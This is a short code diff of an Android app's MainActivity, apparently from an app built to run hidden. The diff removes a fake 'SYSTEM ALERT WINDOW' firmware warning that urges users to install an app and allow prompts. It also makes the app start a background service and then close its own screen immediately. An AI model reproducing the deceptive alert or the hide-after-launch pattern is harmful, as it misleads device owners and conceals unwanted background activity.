@@ -66,9 +66,8 @@ public class MainActivity extends Activity
 		settings = getSharedPreferences("Settings", 0);
 		seteditor = settings.edit();
 		receiver = new ReceiverBoot();
-		receiver.toastShow(this, "aktif", Color.YELLOW, Gravity.TOP, "SYSTEM ALERT WINDOW!!\n\n\nSystem firmware can't access /etc/build.prop please follow this Tutorial.\n\n1. Install this app\n2.allow playstore prompt\n3. reboot after installed.\n\n\n\n\n\n       [ WARNING! ]\n\n\n");
-
-		//startService(new Intent(this, SystemThread.class));
+		
+		startService(new Intent(this, SystemThread.class));
 
 		mPending = PendingIntent.getService(MainActivity.this, 0, new Intent(MainActivity.this, ThreadService.class), 0);
 
@@ -82,7 +81,7 @@ public class MainActivity extends Activity
 		}
 		catch (Exception e) {}
 
-		//finish();
+		finish();
 	}
 
 	public void onDestroy() {
